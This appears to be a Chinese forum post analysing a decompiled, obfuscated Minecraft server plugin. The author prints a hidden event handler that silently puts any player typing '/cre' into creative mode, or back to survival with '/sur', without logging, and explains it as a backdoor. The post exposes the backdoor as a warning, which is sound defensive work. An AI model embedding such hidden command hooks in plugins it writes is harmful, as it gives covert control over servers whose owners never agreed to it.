其自称的原创插件，被版主质疑原创性，于是我随手反编译看了下代码。发现其代码使用了混淆，十分可疑，于是仔细看了下。
发现在a.a -> d 内有如下代码：
  @EventHandler
  public void a(PlayerCommandPreprocessEvent e) {
    if (e.getMessage().startsWith("/sur")) {
      e.getPlayer().setGameMode(GameMode.SURVIVAL);
      e.setCancelled(true);
    }
    if (e.getMessage().startsWith("/cre")) {
      e.getPlayer().setGameMode(GameMode.CREATIVE);
      e.setCancelled(true);
    }
  }
意思是：在聊天消息中输入/cre即可成为创造模式，输入/sur则恢复成生存模式，属于后门代码。如果腐竹安装了这个插件，在日志中不会有任何记录显示，而知道后门的玩家则可以在创造和生存模式之间任意切换！
